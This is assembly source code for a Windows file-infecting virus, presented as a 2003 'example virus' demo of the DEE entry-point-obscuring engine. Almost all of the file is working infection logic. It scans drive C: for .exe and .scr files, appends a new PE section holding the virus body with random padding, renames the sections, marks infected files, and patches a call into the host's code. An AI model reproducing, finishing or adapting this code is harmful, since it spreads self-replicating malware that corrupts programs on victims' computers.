
;같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같�
;
; Example virus (LDIZX+DEE) DEMO.2
; (c) Daniloff Lab's 2003
;
; (812) 387-6408,388-6424
; (095) 137-0150,135-62-53
; Call now!
;같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같�

include import.ash
include macros.ash
include pe.ash
include win32api.ash
include dee\dee.ash


extrn	ExitProcess:near
extrn   MessageBoxA:near
includelib import32.lib

DEBUG=1
ATOM			equ 		"D3M0"
@@x			equ		<-offset delta>


	.586p
	.model flat
	.data

___title:	db "WIN9X.DEE.Demo.2",0
___msg:		db "WIN9X.DEE.Demo.2",10,13,10,13
		db " - Atom name is '",ATOM,"'",0


	.code
host:
		call virstart

	        push MB_OK
        	push offset ___title
        	push offset ___msg
	        push 0
        	call MessageBoxA

		push 0
		call ExitProcess

;같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같

virstart:
		pushfd					; Save flags
		pusha					; & registers

		call delta				; Get delta
delta:		                                        ;
		pop ebp

		mov edi,[esp+4*8+4]			;
		mov ecx,5				; Correct return
		sub edi,ecx				; adress
		mov [esp+4*8+4],edi			;
	
		lea esi,[ebp+ old_cmd @@x]		; Restore old
		rep movsb                               ; command

		lea edx,[ebp+atom_name @@x]		;
		call findatom                           ; Check atom
		jnz return_to_host                      ; presence

		call addatom				; Add atom
		mov [ebp+atom_id @@x],eax               ;

		mov [ebp+infect_delta @@x],ebp		; Save delta

		xor eax,eax
		push eax

		push esp                                ; ThreadidPtr
		push eax	                        ; cflags
		push ebp				; params
		pusho just_thread			; thread_offset
		push eax                	        ; stack_size
		push eax				; attributes
		kernelCall CreateThread			; Create thread
		pop eax

return_to_host:

		popa
		popfd
		ret

;같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같
;
;같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같

just_thread:
		mov ebp,[esp+4]				; Get delta

		call randomize                          ; Generate seed
		mov [ebp+seed @@x],eax                  ;

		lea ebx,[ebp+offset infect @@x]

		pushx C:\#                		;
		mov edx,esp                             ; Scan drive
		call walk                               ;
		add esp,xsize                           ;

		mov eax,[ebp+atom_id @@x]               ; Release atom
		call killatom				; 

		push 0					; Exit from 
		kernelCall ExitThread                   ; thread

;께 INFECT 께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께
;
;IN:	EDX=fill filename
;
;께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께
infect:
;		int 3

		pusha
		mov ebp,12345678h			; EBP = delta
infect_delta	equ	$-4		                ;

	        mov edi,edx				;
		xor eax,eax                             ;
		xor ecx,ecx                             ;
		dec ecx                                 ;
		repnz scasb                             ;
		                                        ;
       		mov eax,[edi-4]                         ;
       		                                        ; Look for
	        cmp eax,'EXE'	                        ; exes,scrs.
       		je i_exe                                ;
       		                                        ;
	        cmp eax,'exe'	                        ;
       		je i_exe                                ;
       		                                        ;
	        cmp eax,'scr'				;
       		je i_exe                                ;
       		                                        ;
	        cmp eax,'SCR'                           ;
       		jne i_exit                              ;
	
i_exe:

                ;EDX=name				; Open file
	        call fopen                              ;

		inc eax
		jz i_exit
		dec eax

		xchg eax,ebx				; EBX=handle

		call fsize				; 
		xchg eax,ecx                            ; ECX = file size
		mov [ebp+file_size @@x],ecx		;

		push ecx				;
		call malloc                             ; Allocate bufer
		add esp,4                               ;

		xchg edx,eax                            ; Read file
		call fread		                ;

		push ebx

	        cmp 2 ptr [edx+18h],0040h
       		jne i_exit_free

	        cmp 4 ptr [edx.mz_oeminfo],'balD'	; Check signature 
     		je i_exit_free                          ;  (Daniloff Lab)

	        mov ebx,[edx.mz_peOffset]		; EBX = NE header
		add ebx,edx                             ;

       		cmp [ebx.pe_sign],'EP'
       		jne i_exit_free

		movzx eax,[ebx.pe_NThsize]		; EAX = OBJ table
		lea eax,[ebx+eax+18h]                   ;
		
                movzx ecx,[ebx.pe_objcnt]
		imul ecx,ecx,40

		lea esi,[eax+ecx]			; ESI = hole size
		sub esi,edx                             ;

		cmp esi,40				; Check for some space
		jb i_exit_free                          ; between header & 
		                                        ; 1st object
		push ebx
		push eax

;께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께�

		add eax,ecx				; EAX = null section
		lea ecx,[eax-40]			; ECX = last section


		mov esi,[ebx.pe_vAligment]              ; ESI=Virtual  alingment
		mov edi,[ebx.pe_pAligment]		; EDI=Physical alingment

		push eax
		mov ebx,[ecx.pe_Obj_RVA]		;
		add ebx,[ecx.pe_Obj_vSize]              ; Virtual end

		mov eax,[ecx.pe_Obj_offset]		; Physical end
		add eax,[ecx.pe_Obj_pSize]		;
		xchg ecx,eax				;
		pop eax

		push esi
		push edi

		add ebx,esi
		neg esi
		and ebx,esi

		add ecx,edi
		neg edi
		and ecx,edi

		pop edi
		pop esi

;		int 3

		mov [eax.pe_Obj_RVA],ebx		; RVA
		mov [eax.pe_Obj_offset],ecx		; Offset

		mov ebx,virsize+1000h

		push eax                                ;
		lea ecx,[ebp+seed @@x]                  ;

		push [ebp+file_size @@x]                ;
		push ecx                                ; Add to body some
		call rnd                                ; random size
		add esp,8

		add ebx,eax

		push eax
		push ecx
		call rnd
		add esp,8

		mov [ebp+obj_delta @@x],eax		; EAX = Random 
		pop eax                                 ;   in-section delta

		push ebx
		add ebx,esi				;
		neg esi					; Virtual
		and ebx,esi                             ;
		mov [eax.pe_Obj_vSize],ebx              ;
		pop ebx

		add ebx,edi				; 
		neg edi					; Physical
		and ebx,edi                             ;
		mov [eax.pe_Obj_pSize],ebx		;

	        mov [eax.pe_Obj_flags],0E0000020h	; flags

		mov [ebp+new_object @@x],eax

;께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께�

		pop eax 
		pop ebx

		mov esi,[ebx.pe_RVA]			; ESI = code RVA

		mov ecx,[eax.pe_Obj_RVA]
		cmp ecx,[ebx.pe_codeRVA]
		jne i_exit_free

		sub esi,ecx				; ESI = physical .code
		add esi,[eax.pe_Obj_offset]		; entrypoint
		add esi,edx				;

	        mov 4 ptr[edx.mz_oeminfo],'balD'        ;
		add [ebx.pe_headersize],40		; increse headers size
		inc [ebx.pe_objcnt]			; +1 object

		mov edi,[ebp+new_object @@x]		;

		mov ecx,[edi.pe_Obj_RVA]		;
		add ecx,[edi.pe_Obj_vSize]              ; Modify image size
		mov [ebx.pe_imagesize],ecx              ;

	        or [eax.pe_Obj_flags],0E0000020h	; .code flags

		mov [ebp+first_object @@x],eax

		xchg edi,eax
                movzx ecx,[ebx.pe_objcnt]
		mov eax,'0XPU'

rename_obj:						;
		stosd                                   ;
		rol eax,8                               ; 
		inc al                                  ;
		ror eax,8                               ;
							;
		push eax                                ; Rename sections
		xor eax,eax                             ;
		stosd                                   ;
		pop eax					;
		                                        ;
		add edi,40-8				;
		loop rename_obj                         ;
                 
comment ~
@@__dflags	      equ             4 ptr[ebp+32 @d]
@@__dasmtbl	      equ             4 ptr[ebp+28 @d]
@@__dasm	      equ             4 ptr[ebp+24 @d]
@@__seed	      equ             4 ptr[ebp+20 @d]
@@__rnd		      equ             4 ptr[ebp+16 @d]
@@__free              equ             4 ptr[ebp+12 @d]
@@__malloc            equ             4 ptr[ebp+8  @d]
@@__csize             equ             4 ptr[ebp+4  @d]
@@__code              equ             4 ptr[ebp    @d]~

		;EDI=physical RVA

		mov ecx,[ebx.pe_codeSize]
		or ecx,ecx
		jz i_exit_free

		push 1000h
		call malloc
		
		push eax
		call ldizx_init
		add esp,8

		xchg eax,edi				; EDI = tables
		lea eax,[ebp+seed @@x]

		push DEE_LINKS				; flags
		push edi				; dtables
		pusho ldizx				; dasm
		push eax                                ; seed ptr
		pusho rnd                               ; rnd
		pusho free                              ; free
		pusho malloc				; malloc
		push ecx                                ; csize
		push esi				; code
		call dee
		add esp,4*9

		push edi
		call free
		add esp,4

		inc eax
		jz i_exit_free
		dec eax

		mov esi,eax
		push esi

		sub eax,edx
		mov ecx,[ebp+first_object @@x]
		sub eax,[ecx.pe_Obj_offset]
		add eax,[ecx.pe_Obj_RVA]		; EAX = command RVA

		mov ecx,[ebp+new_object @@x]		;
		mov ecx,[ecx.pe_Obj_RVA]		; 
		add ecx,[ebp+obj_delta @@x]		;
		sub ecx,eax                             ; EAX = delta
		sub ecx,5				;
		xchg eax,ecx                            ;
		
		lea edi,[ebp+old_cmd @@x]		; 
		mov ecx,5                               ; Copy bytes
		rep movsb                               ;

		pop edi

		scasb                                   ;
		stosd                                   ; Write Call
		mov 1 ptr[edi-5],0E8h			;

;께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께�

		mov esi,ebx				; ESI = PE header
		pop ebx

	
		xor ecx,ecx
		mov eax,FILE_BEGIN
		call fseek

		mov ecx,[esi.pe_headersize]		;
		;EDX = headers                          ; Write headers
		call fwrite                             ;

;------------------------------------------------------------------------------

;		int 3

		mov edi,[ebp+new_object	@@x]		;
		mov ecx,[edi.pe_Obj_offset]             ; Seek to new object
		mov eax,FILE_BEGIN                      ;
		call fseek                              ;

		push edx

		push [edi.pe_Obj_pSize]			;
		call malloc                             ; Allocate bufer for
;		add esp,4                               ; object


;		push 4 ptr[edi.pe_Obj_pSize]		

		xchg edi,eax
		mov ecx,[ebp+obj_delta @@x]

		push edi

;------------------------------------------------------------------------------
obj_garbage:
		push 100h				;
		lea eax,[ebp+seed @@x]                  ;
		push eax                                ;
		call rnd		                ; Write garbage
		add esp,8                               ;
		                                        ;
		stosb                                   ;
		loop obj_garbage                        ;

;------------------------------------------------------------------------------

		lea esi,[ebp+virstart @@x]              ;
		mov ecx,virsize                         ; Write body to bufer
		rep movsb				;

		pop edx					; EDX = bufer
		pop ecx                                 ; ECX = object size
		call fwrite				; Write object

		push edx
		call free
		add esp,4
		pop edx

;------------------------------------------------------------------------------

		mov esi,[ebp+first_object @@x]		;
		mov ecx,[esi.pe_Obj_offset]             ; Seek to code object
		mov eax,FILE_BEGIN                      ;
		call fseek                              ;

		add edx,ecx				; EDX=code offsety
		mov ecx,[esi.pe_Obj_pSize]              ; code size
		call fwrite                             ;

		call fclose

		jmp i_exit_free_nc
;------------------------------------------------------------------------------

i_exit_free:

		pop ebx
                call fclose

i_exit_free_nc:
		push edx
		call free
		add esp,4

i_exit:
		popa
		ret


include dee\dee.inc
include ldizx\ldizx.inc

include import.inc
include search.inc
include fio.inc
include system.inc
include rnd.inc

old_cmd		db 	90h,90h,90h,90h,90h
atom_name       db 	ATOM,0

virsize = $-offset virstart

file_size	dd	?
obj_delta	dd	?
new_object	dd	?
first_object	dd	?
atom_id		dd 	?
seed		dd	?

;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
        db "DEE.Demo.b (c) Daniloff's Labs and DialogueScience"
	ascii_size virsize
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


end	host